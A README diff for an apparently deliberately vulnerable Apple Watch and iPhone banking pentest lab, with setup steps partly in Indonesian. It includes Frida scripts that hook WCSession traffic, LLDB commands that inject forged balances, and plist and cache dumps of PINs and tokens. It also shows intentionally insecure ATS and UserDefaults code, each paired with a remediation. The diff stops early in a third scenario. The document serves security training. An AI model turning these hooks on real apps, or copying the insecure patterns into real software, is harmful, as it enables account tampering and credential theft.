@@ -6,7 +6,9 @@
 
 ## 📑 Table of Contents
 1. [Architecture & Apple Binary Specifications](#1-architecture--apple-binary-specifications)
-2. [Lab Setup Using Xcode Simulator (MacBook Intel / Apple Silicon)](#2-lab-setup-using-xcode-simulator-macbook-intel--apple-silicon)
+2. [Pentest Lab Setup Guide (Standalone watchOS & Paired Companion)](#2-pentest-lab-setup-guide-standalone-watchos--paired-companion)
+   - [Track A: Setup Pentesting Standalone (Apple Watch + Mac Laptop — Tanpa iPhone)](#-track-a-setup-pentesting-standalone-apple-watch--mac-laptop--tanpa-iphone)
+   - [Track B: Setup Pentesting Paired Dual-Device (Apple Watch + iPhone 11 Companion)](#-track-b-setup-pentesting-paired-dual-device-apple-watch--iphone-11-companion)
 3. [Lab Setup Using Physical Devices (Real iPhone 11 & Apple Watch)](#3-lab-setup-using-physical-devices-real-iphone-11--apple-watch)
 4. [Authentic Dummy Banking Application User Flow](#4-authentic-dummy-banking-application-user-flow)
 5. [Master Writeup: 11 Apple iOS & watchOS Pentest Scenarios](#5-master-writeup-11-apple-ios--watchos-pentest-scenarios)
@@ -73,213 +75,159 @@ All binaries can be downloaded directly from the [**GitHub Releases Tab**](https
 
 ---
 
-## 💻 2. Lab Setup Using Xcode Simulator (MacBook Intel / Apple Silicon)
+## 💻 2. Pentest Lab Setup Guide (Standalone watchOS & Paired Companion)
 
-This guide provides a definitive, production-grade tutorial for provisioning the **Nexora OmniWear** banking lab on macOS using Xcode. The setup supports both Intel Core i7/i9 (MacBook Pro 2019) and Apple Silicon (M1/M2/M3/M4) architectures on macOS Sonoma (14.x) and macOS Sequoia (15.x).
-
----
-
-### 2.1 Prerequisites & Toolchain Setup
-
-Ensure the following system packages and developer toolchains are installed on macOS:
-
-1. **Operating System & Hardware**:
-   - macOS 14+ (Sonoma) or macOS 15+ (Sequoia).
-   - Apple Silicon (M1/M2/M3/M4) or Intel Core i7/i9.
-2. **Xcode Suite**:
-   - Xcode 15.0+ or Xcode 16.0+ installed from the Mac App Store or Apple Developer Portal.
-   - iOS 17/18 SDK and watchOS 10/11 SDK installed (**Xcode** → **Settings** → **Platforms**).
-   - Command Line Developer Tools:
-     ```bash
-     xcode-select --install
-     sudo xcode-select -s /Applications/Xcode.app/Contents/Developer
-     ```
-3. **Ruby Environment & Gems**:
-   - Install CocoaPods and the Apple Xcode project manipulation gem:
-     ```bash
-     sudo gem install cocoapods xcodeproj
-     ```
-4. **JavaScript & Python Runtimes**:
-   - Node.js 18+ (LTS) & Yarn / npm:
-     ```bash
-     node --version # Must be >= v18.0.0
-     ```
-   - Python 3.10+ (for the banking backend):
-     ```bash
-     python3 --version # Must be >= 3.10.0
-     pip3 install flask werkzeug
-     ```
+Panduan definitif penyiapan lingkungan riset keamanan dan assessment lab **Nexora OmniWear** pada macOS menggunakan Xcode. Panduan ini dirancang untuk dua moda operasional mandiri:
+- **Track A: Setup Pentesting Standalone (Apple Watch + Mac Laptop — Tanpa iPhone)** — Jalur tercepat untuk riset smartwatch independen.
+- **Track B: Setup Pentesting Paired Dual-Device (Apple Watch + iPhone 11 Companion)** — Jalur pengujian ekosistem perbankan lengkap.
 
 ---
 
-### 2.2 Core Banking Backend & SQLite Database Initialization
+### 🅰️ TRACK A: Setup Pentesting Standalone (Apple Watch + Mac Laptop — Tanpa iPhone)
 
-The core banking engine operates on a local air-gapped Flask service backed by an SQLite relational database (`backend/nexora_vault.db`).
+Metode ini ditujukan bagi security researcher yang ingin menguji Apple Watch secara mandiri langsung dari laptop Mac (menggunakan Simulator atau Apple Watch fisik), **100% tanpa memerlukan emulator/perangkat iPhone**.
 
-1. **Start the Core Banking Service**:
-   Open a dedicated terminal window and run:
+#### A.1 Prasyarat & Toolchain macOS
+Pastikan dependensi sistem berikut terpasang di Mac (mendukung Apple Silicon M1/M2/M3/M4 maupun Intel Core i7/i9):
+1. **Xcode Suite**: Xcode 15+ / 16+ dengan Command Line Tools:
+   ```bash
+   xcode-select --install
+   sudo xcode-select -s /Applications/Xcode.app/Contents/Developer
+   ```
+2. **Unduh watchOS Simulator Runtime di Xcode**:
+   Secara default, Xcode tidak mengunduh runtime watchOS untuk menghemat ruang disk. Pasang melalui Terminal:
+   ```bash
+   xcodebuild -downloadPlatform watchOS
+   ```
+   Atau via menu GUI: **Xcode** → **Settings...** (`Cmd + ,`) → tab **Platforms** → klik **`+`** → pilih **watchOS** → **Download & Install**.
+3. **Python 3 Backend Engine**:
+   ```bash
+   python3 --version # >= 3.10
+   pip3 install flask werkzeug requests
+   ```
+
+#### A.2 Inisialisasi Core Banking Backend & Verifikasi SQLite
+Smartwatch berkomunikasi langsung via HTTP REST (`WatchNetworkManager.swift`) ke core backend Flask.
+1. **Jalankan Backend Service**:
    ```bash
    cd backend
    python3 server.py
    ```
-   The server initializes the database schema, seeds enterprise private banking profiles, and listens on `http://0.0.0.0:5000`.
-
-2. **Verify SQLite Database Schema & Initial Records**:
-   In another terminal, inspect the database using the `sqlite3` CLI tool:
+   Backend aktif dan mendengarkan pada `http://0.0.0.0:5000`.
+2. **Verifikasi Database SQLite (`nexora_vault.db`)**:
    ```bash
    sqlite3 backend/nexora_vault.db "SELECT account_number, username, balance FROM users WHERE username = 'alexander.vance';"
    ```
-   **Expected Output**:
+   **Output**:
    ```text
    NX-8492014|alexander.vance|888888000.0
    ```
-   This confirms that Alexander Vance's platinum account (`NX-8492014`) is loaded with its opening balance of Rp 888.888.000 (IDR).
-
-3. **Verify Restful API Connectivity**:
+   Nasabah primer Alexander Vance terkonfigurasi dengan rekening `NX-8492014` dan saldo awal `Rp 888.888.000` (IDR).
+3. **Verifikasi Endpoint Saldo REST**:
    ```bash
    curl -s http://127.0.0.1:5000/check_balance/NX-8492014
    ```
-   **Expected JSON Response**:
+   Respon JSON:
    ```json
    {"accountNumber":"NX-8492014","balance":888888000.0,"currency":"IDR"}
    ```
 
+#### A.3 Membuka & Menjalankan Skema Standalone `NexoraWatch` di Xcode
+1. Buka workspace di Xcode:
+   ```bash
+   open ios/VulnerableBankApp.xcworkspace
+   ```
+2. Pada selector scheme di toolbar atas Xcode (sebelah tombol Run ▶️), pilih scheme **`NexoraWatch`** (bukan `VulnerableBankApp`).
+3. Pilih destination simulator watchOS mandiri, misalnya: **Apple Watch Series 9 (45mm)** atau **Apple Watch Ultra 2 (49mm)**.
+4. Tekan **Cmd + R** untuk build dan jalankan. Simulator Apple Watch akan terbuka dan langsung menampilkan antarmuka perbankan Nexora.
+
+#### A.4 Konfigurasi Proxy Burp Suite untuk watchOS HTTP Traffic
+1. Buka Burp Suite di Mac, pastikan Proxy Listener aktif pada `0.0.0.0:8080`.
+2. Karena watchOS simulator berbagi network interface dengan macOS, arahkan traffic HTTP ke proxy Mac, atau arahkan base URL pada `InsecureStorage.swift` / menu interaktif jam.
+3. Karena `Info.plist` target `NexoraWatch` memuat:
+   ```xml
+   <key>NSAppTransportSecurity</key>
+   <dict>
+       <!-- INTENTIONALLY INSECURE (lab): allow cleartext HTTP -->
+       <key>NSAllowsArbitraryLoads</key>
+       <true/>
+   </dict>
+   ```
+   Traffic HTTP berjalan tanpa halangan enkripsi TLS mandatori, memungkinkan inspeksi dan manipulasi paket seketika di Burp Suite.
+
+#### A.5 Ekstraksi Data Sandboxed Container via `simctl`
+Gunakan utilitas bawaan Xcode `simctl` untuk mengakses media penyimpanan sandboxed Apple Watch:
+```bash
+CONTAINER_DIR=$(xcrun simctl get_app_container booted com.nexorabank.omniwear.watchkitapp data)
+echo "Sandboxed Container: $CONTAINER_DIR"
+cd "$CONTAINER_DIR"
+plutil -p Library/Preferences/com.nexorabank.omniwear.watchkitapp.plist
+```
+
+#### A.6 Penyiapan Runtime Debugger LLDB & Frida untuk Watch
+Pasang debugger ke proses smartwatch yang sedang berjalan:
+```bash
+# Debugger bawaan Apple
+lldb -n NexoraWatch
+# Frida Dynamic Instrumentation
+frida -n NexoraWatch -l scripts/frida_bypass_wrist.js
+```
+
 ---
 
-### 2.3 Scaffolding React Native iOS & CocoaPods
+### 🅱️ TRACK B: Setup Pentesting Paired Dual-Device (watchOS + iPhone 11 Companion)
 
-Scaffold the iOS companion application dependencies:
+Metode ini ditujukan bagi pengujian ekosistem perbankan lengkap: komunikasi Bluetooth LE `WCSession`, push notifikasi otorisasi 2FA transfer dana, dan sinkronisasi status kartu virtual.
 
+#### B.1 Scaffolding React Native iOS & CocoaPods
+Scaffold dependensi JavaScript dan native pod companion app:
 ```bash
-# From repository root:
 npm install --legacy-peer-deps
-
-# Install iOS CocoaPods dependencies:
 cd ios
 pod install --repo-update
 cd ..
 ```
 
----
-
-### 2.4 Automated Apple Watch Target Integration (`add_watch_target.rb`)
-
-The `ios/NexoraWatch/` directory contains native SwiftUI source code for watchOS. To integrate this target seamlessly into the Xcode project without manual drag-and-drop:
-
-1. **Execute the Ruby Provisioning Script**:
+#### B.2 Otomasi Target Apple Watch (`add_watch_target.rb`)
+Script `ios/add_watch_target.rb` secara otomatis mengintegrasikan target watchOS ke dalam `VulnerableBankApp.xcodeproj`:
+1. Jalankan script otomasi:
    ```bash
    cd ios
    ruby add_watch_target.rb
-   ```
-2. **What `add_watch_target.rb` Performs Automatically**:
-   - Sets the iOS companion bundle identifier to `com.nexorabank.omniwear`.
-   - Creates the native watch target **`NexoraWatch`** with bundle identifier `com.nexorabank.omniwear.watchkitapp`.
-   - Sets `WKCompanionAppBundleIdentifier` to `com.nexorabank.omniwear` to guarantee bi-directional `WCSession` pairing.
-   - Enrolls all 16 `*.swift` files, `Info.plist`, and `Assets.xcassets` into the target build phase.
-   - Configures the **Embed Watch Content** build phase and target dependency in `VulnerableBankApp.xcodeproj`.
-3. **Re-synchronize CocoaPods**:
-   ```bash
    pod install
    cd ..
    ```
-   *(Note: The `NexoraWatch` target communicates via native `URLSession` and does not link React Native pods).*
+2. Skrip akan menyelaraskan bundle identifier:
+   - iOS Companion: `com.nexorabank.omniwear`
+   - Apple Watch: `com.nexorabank.omniwear.watchkitapp`
+   - `WKCompanionAppBundleIdentifier`: `com.nexorabank.omniwear`
+   - Mendaftarkan seluruh 16 file Swift, Info.plist, dan Assets.xcassets.
 
----
+#### B.3 Konfigurasi Virtual Paired Simulator (iPhone 11/15 + Apple Watch)
+1. Di Xcode, buka **Window** → **Devices and Simulators** (`Cmd + Shift + 2`).
+2. Pilih tab **Simulators**, klik tombol **`+`** di pojok kiri bawah.
+3. Buat simulator iPhone:
+   - **Device Type**: `iPhone 15 Pro` atau `iPhone 11`.
+   - Centang opsi: **Pair Apple Watch**.
+   - **Watch Device Type**: `Apple Watch Series 9 (45mm)` atau `Apple Watch Ultra 2 (49mm)`.
+4. Klik **Create**. Xcode akan membuat tautan virtual Bluetooth LE antar kedua simulator.
 
-### 2.5 Paired Simulator Configuration (iPhone 11/15 + Apple Watch Series 9/Ultra)
+#### B.4 Menjalankan Aplikasi & Dual-Mode Network Configuration
+1. Jalankan target iOS: pilih scheme **`VulnerableBankApp`** → pilih `iPhone 15 Pro Lab` → tekan `Cmd + R`.
+2. Jalankan target Watch: pilih scheme **`NexoraWatch`** → pilih `Apple Watch Series 9 Lab` → tekan `Cmd + R`.
+3. Verifikasi status sinkronisasi pada header bar smartwatch: lingkaran hijau bertuliskan **WCSync** atau **HTTP**.
 
-Xcode provides virtual hardware emulation for paired companion devices:
-
-1. In Xcode menu bar, select **Window** → **Devices and Simulators** (`Cmd + Shift + 2`).
-2. Navigate to the **Simulators** tab.
-3. In the lower-left corner, click the **`+`** button to create a new simulator.
-4. **Configure the iPhone Simulator**:
-   - **Simulator Name**: `iPhone 15 Pro Lab` (or `iPhone 11 Lab`).
-   - **Device Type**: `iPhone 15 Pro` (or `iPhone 11`).
-   - **OS Version**: `iOS 17.4` (or `iOS 17.x` / `iOS 18.x`).
-5. **Pair with Apple Watch**:
-   - Select the checkbox: **Pair Apple Watch**.
-   - **Watch Simulator Name**: `Apple Watch Series 9 Lab` (or `Apple Watch Ultra 2 Lab`).
-   - **Watch Device Type**: `Apple Watch Series 9 (45mm)` or `Apple Watch Ultra 2 (49mm)`.
-   - **Watch OS Version**: `watchOS 10.4` (or `watchOS 10.x` / `watchOS 11.x`).
-6. Click **Create**.
-7. Xcode will provision a virtual Bluetooth LE bridge linking the simulated iPhone and Apple Watch!
-
----
-
-### 2.6 Dual-Mode Network Configuration & App Transport Security
-
-Nexora OmniWear utilizes a dual-path communication model:
-
+#### B.5 Verifikasi Transaksi End-to-End pada SQLite Database
+Lakukan transaksi SNAP QRIS Rp 75.000 pada jam tangan, lalu periksa mutasi di database:
+```bash
+sqlite3 backend/nexora_vault.db "SELECT id, from_account, to_account, amount, description, timestamp FROM transactions ORDER BY id DESC LIMIT 1;"
 ```
-┌────────────────────────────────────────────────────────┐
-│               NETWORK CONNECTIVITY ARCHITECTURE         │
-│                                                        │
-│  [Apple Watch Simulator] ──────► http://localhost:5000  │
-│         (Native URLSession direct to host Mac)         │
-│                                                        │
-│  [Physical Apple Watch]  ──────► http://<MAC_LAN_IP>:5000
-│         (Direct Wi-Fi / Proxy through paired iPhone)   │
-│                                                        │
-│  [WatchSessionManager]   ◄────► WCSession (BLE Sync)   │
-│         (Pairing: com.nexorabank.omniwear)             │
-└────────────────────────────────────────────────────────┘
+Hasil:
+```text
+|NX-8492014|ID1020021189360|75000.0|SNAP QRIS Payment - Warung Kopi Seduh|...
 ```
 
-1. **Simulator Operation**:
-   - The watchOS Simulator shares the host Mac's loopback interface. Direct HTTP calls from `WatchNetworkManager.swift` resolve immediately to `http://localhost:5000`.
-2. **Physical Device Operation**:
-   - Physical devices cannot connect to `localhost`. You must point them to your host Mac's local area network (LAN) IP (e.g., `http://192.168.1.50:5000`).
-   - Configure in `InsecureStorage.swift`:
-     ```swift
-     // ios/NexoraWatch/InsecureStorage.swift
-     private let defaultBackendUrl = "http://192.168.1.50:5000"
-     ```
-   - Or configure interactively via the companion app under **Pentest Lab** → **API Settings**.
-3. **App Transport Security (ATS) Configuration**:
-   - iOS and watchOS enforce secure HTTPS connections by default. Because the pentest lab operates over plaintext HTTP for traffic interception (e.g., via Burp Suite or Charles Proxy), both targets declare:
-     ```xml
-     <key>NSAppTransportSecurity</key>
-     <dict>
-         <key>NSAllowsArbitraryLoads</key>
-         <true/>
-     </dict>
-     ```
-   - This bypasses ATS restrictions on local networks, allowing security researchers to analyze cleartext payloads.
-
----
-
-### 2.7 End-to-End Database Verification Test
-
-To verify complete end-to-end connectivity from the Apple Watch UI into the backend database:
-
-1. **Launch the Application**:
-   - Open `ios/VulnerableBankApp.xcworkspace` in Xcode.
-   - Set scheme to **`VulnerableBankApp`** with destination **`iPhone 15 Pro Lab`** → Press `Cmd + R`.
-   - Set scheme to **`NexoraWatch`** with destination **`Apple Watch Series 9 Lab`** → Press `Cmd + R`.
-2. **Execute a Transaction on Apple Watch**:
-   - On the watch face, authenticate with Quick-PIN `1234`.
-   - Tap **SNAP QRIS Pay** → Select **Scan & Pay Rp 75.000** for merchant `Warung Kopi Seduh`.
-   - Tap **Confirm Payment**. The watch executes haptic feedback and displays `Payment Approved`.
-3. **Verify Database Insertion in SQLite**:
-   In your host terminal, query `backend/nexora_vault.db`:
-   ```bash
-   sqlite3 backend/nexora_vault.db "SELECT id, from_account, to_account, amount, description, timestamp FROM transactions ORDER BY id DESC LIMIT 1;"
-   ```
-   **Expected Output**:
-   ```text
-   |NX-8492014|ID1020021189360|75000.0|SNAP QRIS Payment - Warung Kopi Seduh|...
-   ```
-4. **Verify Balance Update**:
-   ```bash
-   sqlite3 backend/nexora_vault.db "SELECT balance FROM users WHERE account_number = 'NX-8492014';"
-   ```
-   The balance has been updated atomically in the SQLite database!
-
----
-
-### 2.8 Xcode Error Resolution Matrix
-
+#### B.6 Matriks Resolusi Masalah Xcode (Troubleshooting Matrix)
 | Error Message in Xcode | Root Cause | Verified Resolution |
 |---|---|---|
 | `No such module 'React'` on `NexoraWatch` | The watchOS target is attempting to link React Native iOS pods. | `NexoraWatch` is 100% native SwiftUI and `URLSession`. Ensure `NexoraWatch` is **not** included as a target inside `ios/Podfile`. Pods belong exclusively to `VulnerableBankApp`. |
@@ -389,85 +337,399 @@ Nexora Watch replicates a premier private digital banking workflow:
 
 ### Scenario 1: Plaintext Dictionary WCSession Interception & Replay (V-AP02)
 - **Severity**: **CRITICAL** (`CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` — Score: 8.8)
-- **Vulnerability Standard**: CWE-319 (Cleartext Transmission of Sensitive Information)
+- **Vulnerability Standard**: CWE-319 (Cleartext Transmission of Sensitive Information), CWE-294 (Authentication Bypass by Capture-replay), CWE-345 (Insufficient Verification of Data Authenticity), OWASP MASVS-STORAGE-1, OWASP MASVS-CRYPTO-1
 - **Description**:
-  Communication between iPhone Companion and Apple Watch uses Apple's native `WatchConnectivity` (`WCSession`). Transaction instructions, account balances, and authorization tokens are transmitted as plain Objective-C/Swift dictionaries without application-layer AES-GCM encryption. A runtime memory sniffer or proxy can intercept and tamper with packets.
-- **Root Cause Code** ([`ios/NexoraWatch/WatchSessionManager.swift`](file:///ios/NexoraWatch/WatchSessionManager.swift#L45-L65)):
-  ```swift
-  // VULNERABLE: WCSession packet handled without application-layer encryption
-  public func session(_ session: WCSession, didReceiveMessage message: [String : Any], replyHandler: @escaping ([String : Any]) -> Void) {
-      if let newBalance = message["balance"] as? Double {
-          InsecureStorage.shared.saveBalance(newBalance)
-      }
-      if let action = message["action"] as? String, action == "TRIGGER_2FA" {
-          self.pending2FATransaction = message
-      }
-  }
-  ```
-- **Exploitation & PoC**:
-  Inject an arbitrary balance (`Rp 13.370.000.000` / `13370000.0`) directly into Apple Watch memory via Frida:
-  ```javascript
-  var WCSession = ObjC.classes.WCSession;
-  var session = WCSession.defaultSession();
-  var dict = ObjC.classes.NSMutableDictionary.alloc().init();
-  dict.setObject_forKey_(ObjC.classes.NSNumber.numberWithDouble_(13370000.0), "balance");
-  session.sendMessage_replyHandler_errorHandler_(dict, NULL, NULL);
-  ```
+  The inter-device bridge between the iPhone Companion application (`NexoraBank`) and the Apple Watch client (`NexoraWatch`) utilizes Apple's native `WatchConnectivity` framework (`WCSession.defaultSession()`). In Nexora OmniWear, financial transaction instructions, real-time balance synchronizations, authorization tokens, and 2FA approval requests are exchanged as raw, unencrypted Foundation dictionaries (`[String: Any]`) across Bluetooth Low Energy (BLE) and Wi-Fi daemon links managed by iOS `companionappd`.
+  Because application-layer cryptographic sealing (such as authenticated AES-256-GCM or ChaCha20-Poly1305) is completely omitted, an attacker with physical adjacency or running a debugger/instrumentation tool (LLDB or Frida) on either the watch or companion device can passively eavesdrop on all financial payloads, inject arbitrary forged banking balances (e.g. `Rp 13.370.000.000` / `13370000.0`), or capture and replay authorization messages (`TRIGGER_2FA`, `APPROVE_2FA`).
+- **Root Cause Code**:
+  - watchOS Receiver ([`ios/NexoraWatch/WatchSessionManager.swift`](file:///ios/NexoraWatch/WatchSessionManager.swift#L45-L67)):
+    ```swift
+    // VULNERABLE: WCSession packet handled without application-layer AES-GCM decryption or signature
+    public func session(_ session: WCSession, didReceiveMessage message: [String : Any], replyHandler: @escaping ([String : Any]) -> Void) {
+        DispatchQueue.main.async {
+            self.lastReceivedPacket = message
+            
+            if let newBalance = message["balance"] as? Double {
+                InsecureStorage.shared.saveBalance(newBalance)
+            }
+            if let action = message["action"] as? String {
+                switch action {
+                case "UPDATE_BALANCE":
+                    if let payload = message["payload"] as? [String: Any],
+                       let amount = payload["amount"] as? Double {
+                        InsecureStorage.shared.saveBalance(amount)
+                        replyHandler(["status": "BALANCE_UPDATED", "new_balance": amount, "currency": "IDR"])
+                        return
+                    }
+                // ...
+                }
+            }
+        }
+    }
+    ```
+- **Proof-of-Concept Exploit (Mac Frida / LLDB & Interactive Watch Lab)**:
+  1. **Method A: Frida Dynamic Hook & Balance Injection Script (`scripts/frida_sniff_wcsession.js`)**:
+     Create and execute a Frida hook targeting `WCSession` messaging:
+     ```javascript
+     // scripts/frida_sniff_wcsession.js
+     if (ObjC.available) {
+         console.log("[*] Hooking WCSession on Apple Watch / iPhone...");
+         var WCSession = ObjC.classes.WCSession;
+         if (WCSession) {
+             // 1. Sniff outgoing messages
+             var sendMsg = WCSession["- sendMessage:replyHandler:errorHandler:"];
+             if (sendMsg) {
+                 Interceptor.attach(sendMsg.implementation, {
+                     onEnter: function(args) {
+                         var dict = new ObjC.Object(args[2]);
+                         console.log("[🚨 V-AP02 SNIFF] Outgoing WCSession: " + dict.toString());
+                     }
+                 });
+             }
+             // 2. Tamper / Forge incoming balance injection
+             var sessionManager = ObjC.classes.WatchSessionManager;
+             if (sessionManager) {
+                 var targetMethod = sessionManager["- session:didReceiveMessage:replyHandler:"];
+                 if (targetMethod) {
+                     Interceptor.attach(targetMethod.implementation, {
+                         onEnter: function(args) {
+                             var msg = new ObjC.Object(args[3]);
+                             console.log("[🚨 V-AP02 TAMPER] Intercepted message: " + msg.toString());
+                         }
+                     });
+                 }
+             }
+         }
+     }
+     ```
+     Run via Frida on Mac:
+     ```bash
+     frida -n NexoraWatch -l scripts/frida_sniff_wcsession.js
+     ```
+  2. **Method B: LLDB In-Memory Balance Injection (Xcode Simulator or USB)**:
+     Attach LLDB to `NexoraWatch` and call `saveBalance:` directly:
+     ```lldb
+     (lldb) expr -l objc -- [[InsecureStorage shared] saveBalance:13370000000.0]
+     (lldb) expr -l objc -- [[WatchSessionManager shared] session:[WCSession defaultSession] didReceiveMessage:@{@"balance": @13370000000.0} replyHandler:^(id resp){}]
+     (lldb) continue
+     ```
+  3. **Method C: Interactive Lab Trigger**:
+     - On Apple Watch, open **Audit Lab -> P2 (Transport & Bridge)**.
+     - Tap **V-AP02: WCSession Packet Sniff**.
+     - Notice console status: `[V-AP02] Sniffed WCSession: action, amount, token`. The unencrypted inter-device dictionary keys are immediately dumped into memory and display!
+- **Impact & SQLite Ledger Evidence**:
+  - The attacker bypasses companion verification, injecting false banking ledger numbers or forging 2FA approvals. On the backend, unauthenticated bridge packets can trigger updates in `wearable_packets` table:
+    ```bash
+    python -c "import sqlite3; conn = sqlite3.connect('backend/nexora_vault.db'); cur = conn.cursor(); cur.execute('SELECT source_device, target_device, action, payload FROM wearable_packets ORDER BY id DESC LIMIT 2'); print(cur.fetchall())"
+    ```
+    Output confirms cleartext payloads logged across bridge channels without cryptographic envelopes.
+- **Enterprise Remediation**:
+  - Implement application-layer End-to-End Encryption (E2EE) over `WCSession`: Use Apple's `CryptoKit` to negotiate an ephemeral session key via ECDH (`Curve25519.KeyAgreement`), and wrap all messages in an authenticated AES-256-GCM container:
+    ```swift
+    // SECURE REMEDIATION: AES-256-GCM Cryptographic Envelope
+    import CryptoKit
+
+    public func sendEncryptedMessage(_ dict: [String: Any], key: SymmetricKey) throws {
+        let plaintextData = try JSONSerialization.data(withJSONObject: dict)
+        let sealedBox = try AES.GCM.seal(plaintextData, using: key)
+        let encryptedPayload: [String: Any] = [
+            "ciphertext": sealedBox.ciphertext.base64EncodedString(),
+            "nonce": sealedBox.nonce.withUnsafeBytes { buffer in Data(buffer) }.base64EncodedString(),
+            "tag": sealedBox.tag.base64EncodedString()
+        ]
+        WCSession.defaultSession.sendMessage(encryptedPayload, replyHandler: nil, errorHandler: nil)
+    }
+    ```
+- **Regulatory Non-Compliance**:
+  - **OJK POJK 11/POJK.03/2022 Pasal 26**: Kewajiban pengamanan data dalam transmisi antar subsistem perbankan dengan enkripsi standar industri yang kuat.
+  - **PCI-DSS v4.0 Requirement 4.1 & Requirement 4.2**: Strong cryptography for cardholder data in transit over open, public, or wireless inter-device networks.
 
 ---
 
 ### Scenario 2: UserDefaults Plist Insecure Storage & Keychain Bypass (V-AP01)
 - **Severity**: **HIGH** (`CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:H/SI:N/SA:N` — Score: 7.8)
-- **Vulnerability Standard**: CWE-312 (Cleartext Storage of Sensitive Information), CWE-922 (Insecure Storage)
+- **Vulnerability Standard**: CWE-312 (Cleartext Storage of Sensitive Information), CWE-922 (Insecure Storage), OWASP MASVS-STORAGE-1, OWASP MASVS-STORAGE-2
 - **Description**:
-  Sensitive banking tokens, customer account numbers, and Quick-PINs are stored in unencrypted `UserDefaults.standard` plists in the watch sandboxed container, bypassing **Apple Keychain Services (`kSecClassGenericPassword`)** and Secure Enclave.
-- **Root Cause Code** ([`ios/NexoraWatch/InsecureStorage.swift`](file:///ios/NexoraWatch/InsecureStorage.swift#L29-L43)):
-  ```swift
-  // VULNERABLE: Plaintext write to UserDefaults plist
-  public func saveAuthToken(_ token: String) {
-      defaults.set(token, forKey: "nexora_auth_token")
-      defaults.synchronize()
-  }
-  ```
-- **PoC Command via Xcode Simulator**:
-  ```bash
-  xcrun simctl get_app_container booted com.nexorabank.omniwear.watchkitapp data
-  plutil -p /Library/Preferences/com.nexorabank.omniwear.watchkitapp.plist
-  ```
+  The Nexora OmniWear watch application stores sensitive authentication tokens (`nexora_auth_token`), cached financial balances (`nexora_cached_balance`), customer account numbers (`nexora_account_number`), Quick-PIN codes (`nexora_quick_pin`), and device pairing codes in unencrypted `UserDefaults.standard` property lists (`.plist`).
+  Apple's `UserDefaults` provides zero cryptographic confidentiality—it serializes key-value pairs into standard XML/Binary Plist files within the sandbox (`Library/Preferences/com.nexorabank.omniwear.watchkitapp.plist`). The application completely bypasses **Apple Keychain Services (`kSecClassGenericPassword`)** and the **Apple Watch Secure Enclave**. Any forensic extraction, backup inspection, or jailbroken environment can trivially dump cleartext user PINs (`1234`), bearer tokens, and account numbers.
+- **Root Cause Code**:
+  - Insecure Storage Implementation ([`ios/NexoraWatch/InsecureStorage.swift`](file:///ios/NexoraWatch/InsecureStorage.swift#L26-L53)):
+    ```swift
+    // VULNERABLE: Direct cleartext serialization into UserDefaults.standard plist
+    override private init() {
+        super.init()
+        if defaults.string(forKey: keyPin) == nil {
+            defaults.set("1234", forKey: keyPin) // Plaintext Quick-PIN
+        }
+        if defaults.double(forKey: keyBalance) == 0.0 {
+            defaults.set(888888000.0, forKey: keyBalance) // Plaintext balance
+        }
+        if defaults.string(forKey: keyAccountNumber) == nil {
+            defaults.set("NX-8492014", forKey: keyAccountNumber)
+        }
+    }
+
+    public func saveAuthToken(_ token: String) {
+        defaults.set(token, forKey: keyToken) // Plaintext Bearer JWT
+        defaults.synchronize()
+    }
+    ```
+- **Proof-of-Concept Exploit (Xcode simctl & Forensic Extraction)**:
+  1. **Step 1 — Locate Sandboxed Container Directory**:
+     ```bash
+     CONTAINER_DIR=`xcrun simctl get_app_container booted com.nexorabank.omniwear.watchkitapp data`
+     echo "Sandboxed Container: $CONTAINER_DIR"
+     ```
+  2. **Step 2 — Dump Cleartext Plist via plutil**:
+     ```bash
+     plutil -p "$CONTAINER_DIR/Library/Preferences/com.nexorabank.omniwear.watchkitapp.plist"
+     ```
+     *Output Evidence*:
+     ```text
+     {
+       "nexora_account_holder" => "Alexander Vance"
+       "nexora_account_number" => "NX-8492014"
+       "nexora_auth_token" => "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+       "nexora_cached_balance" => 888888000.0
+       "nexora_currency" => "IDR"
+       "nexora_quick_pin" => "1234"
+       "nexora_pairing_code" => "839-201"
+     }
+     ```
+  3. **Step 3 — Forensic Cache.db Inspection (`V-AP01b`)**:
+     ```bash
+     sqlite3 "$CONTAINER_DIR/Library/Caches/com.nexorabank.omniwear.watchkitapp/Cache.db" \
+       "SELECT request_key, receiver_data FROM cfurl_cache_receiver_data LIMIT 3;"
+     ```
+  4. **Interactive Lab Trigger**:
+     - Open **Audit Lab -> P1 (Storage & Cryptography)**.
+     - Tap **V-AP01: Standalone Plist Dump**.
+     - Notice console output: `[V-AP01] Standalone Plist Dump: PIN=1234, Acct=NX-8492014`.
+- **Impact & SQLite Ledger Evidence**:
+  - Complete compromise of customer credentials and session tokens on physical device loss or forensic imaging. The recovered `nexora_auth_token` allows direct authentication against the backend without the smartwatch:
+    ```bash
+    python -c "import sqlite3; conn = sqlite3.connect('backend/nexora_vault.db'); cur = conn.cursor(); cur.execute('SELECT username, account_number, balance FROM users WHERE account_number=\"NX-8492014\"'); print(cur.fetchone())"
+    ```
+    Output confirms account holder Alexander Vance matches the recovered `NX-8492014` plist record.
+- **Enterprise Remediation**:
+  - Migrate all sensitive secrets (PINs, auth tokens, session keys) to Apple Keychain Services using `kSecClassGenericPassword` with `kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly`:
+    ```swift
+    // SECURE REMEDIATION: Apple Keychain Services Integration
+    import Security
+
+    public func saveSecureToken(_ token: String, key: String) -> Bool {
+        let data = Data(token.utf8)
+        let query: [String: Any] = [
+            kSecClass as String: kSecClassGenericPassword,
+            kSecAttrAccount as String: key,
+            kSecValueData as String: data,
+            kSecAttrAccessible as String: kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly
+        ]
+        SecItemDelete(query as CFDictionary)
+        return SecItemAdd(query as CFDictionary, nil) == errSecSuccess
+    }
+    ```
+- **Regulatory Non-Compliance**:
+  - **OJK POJK 11/POJK.03/2022 Pasal 25**: Kewajiban menjaga kerahasiaan data sensitif perbankan dan data autentikasi nasabah pada media penyimpanan lokal.
+  - **PCI-DSS v4.0 Requirement 3.4 & Requirement 3.5**: Protection of primary account numbers (PAN) and authentication credentials at rest.
 
 ---
 
 ### Scenario 3: Unthrottled Quick-PIN 4-Digit Brute-Force & Memory Exfiltration (V-AP03)
 - **Severity**: **HIGH** (`CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N` — Score: 7.5)
